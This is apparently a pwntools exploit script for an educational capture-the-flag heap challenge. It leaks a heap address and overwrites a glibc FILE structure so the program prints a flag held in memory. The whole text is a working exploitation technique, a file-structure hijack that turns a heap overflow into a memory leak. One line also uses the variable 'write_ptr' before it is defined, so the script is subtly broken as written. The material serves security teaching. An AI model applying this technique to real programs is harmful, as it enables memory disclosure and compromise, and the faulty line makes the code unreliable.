from pwn import *
split = lambda v,sz: [v[i:i+sz] for i in range(0,len(v),sz)]

HOST, PORT = 'edu-ctf.zoolab.org', 30215
if args.HOST: HOST = args.HOST
if args.PORT: PORT = args.PORT

exe = context.binary = ELF('./lab1_release/filenote_r/chal')

if args.REMOTE:
    io = remote(HOST,PORT)
else:
    io = process(exe.path)
    pause()

note_offset = 0x1490
heap_base = int(io.readline().split()[-1], 16) - note_offset
info(f'heap_base: {hex(heap_base)}')

flag_buffer = heap_base + 0x480
tmp_file_offset = 0x16a0

offset = tmp_file_offset - note_offset

flags = 0x0800
write_base = flag_buffer
write_ptr = write_ptr + 0x50
write_end = 0
read_ptr = 0
read_end = write_base
read_base = 0
buf_base = write_base
buf_end = write_ptr
fd = 1

payload = flat({
    offset: [
        flags, read_ptr,
        read_end, read_base,
        write_base, write_ptr,
        write_end, buf_base,
        buf_end, 0,
        0, 0,
        0, 0,
        fd
    ],
})

io.sendlineafter(b'>', b'1')
io.sendlineafter(b'>', b'2')
io.sendlineafter(b'>', payload)
io.sendlineafter(b'>', b'3')

if not args.REMOTE:
    io.interactive()
else:
    flag = io.readuntil(b'}').strip().decode()
    success(flag)
